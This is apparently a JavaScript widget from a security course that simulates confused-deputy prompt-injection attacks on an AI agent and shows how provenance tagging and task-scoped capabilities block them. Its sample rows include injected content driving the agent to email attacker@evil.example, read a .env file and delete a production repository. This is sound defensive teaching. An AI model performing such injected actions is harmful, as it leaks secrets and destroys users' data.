registerSim('a10deputy', function (el) {
  var R = [
    ['send_email', 'to=team@corp', 'alice', 'alice', ['mail.send'], true],
    ['send_email', 'to=attacker@evil.example', 'alice', 'content from https://blog.example/post', ['mail.send'], false],
    ['read_file', 'path=.env', 'alice', 'content from https://blog.example/post', ['fs.read'], false],
    ['delete_repo', 'name=prod', 'alice', 'content from github issue #412', ['repo.admin'], false],
    ['http_get', 'url=https://docs.internal.corp/spec', 'alice', 'alice', ['net.read'], true]
  ];
  var TASK_SCOPES = ['mail.send', 'net.read'];   // what THIS task was granted
  var c = el.querySelector('#a10-check'), o = el.querySelector('#a10-out');

  function render() {
    var mode = c.value, h = '', wrong = 0;
    h += '<span class="dim">action        args                       verdict  reason</span>\n\n';
    R.forEach(function (r) {
      var allow = true, why = '';
      if (mode === 'authn') { allow = true; why = 'signed by ' + r[2]; }
      else {
        if (r[3] !== r[2]) { allow = false; why = 'caused by ' + r[3].slice(0, 34) + ' — provenance mismatch'; }
        else { allow = true; why = 'causer and signer agree'; }
        if (mode === 'prov_scope' && allow && TASK_SCOPES.indexOf(r[4][0]) === -1) {
          allow = false; why = 'scope ' + r[4][0] + ' not in this task capability set';
        }
      }
      if (allow !== r[5]) wrong++;
      h += '  ' + r[0].padEnd(14) + r[1].padEnd(27) +
        (allow ? '<span class="bad">ALLOW</span>  ' : '<span class="ok">DENY </span>  ') +
        '  <span class="dim">' + simUtil.esc(why) + '</span>\n';
    });
    h += '\n  <span class="dim">wrong decisions</span>  ' + (wrong ? '<span class="bad">' + wrong + ' of ' + R.length + '</span>' : '<span class="ok">0 of ' + R.length + '</span>');
    if (mode === 'authn') h += '\n\n  <span class="bad">Every request is allowed, and three of them are attacks.</span>\n  Your IAM log shows alice doing all five, in one session, seconds apart.\n  Nothing here is misconfigured. The information needed to tell them apart\n  is not present in the request.';
    if (mode === 'prov') h += '\n\n  <span class="ok">Provenance separates them.</span> The field does not exist in OAuth, in HTTP,\n  or in any standard authorisation layer — A21 constructs it by tagging values\n  and propagating the tags through every derivation.';
    if (mode === 'prov_scope') h += '\n\n  <span class="ok">Defence in depth.</span> Even if provenance tracking were subverted, the\n  task-scoped capability set has no repo.admin and no fs.read in it, so two\n  of the three attacks fail a second time on the way out.';
    o.innerHTML = h;
  }
  c.onchange = render; render();
});
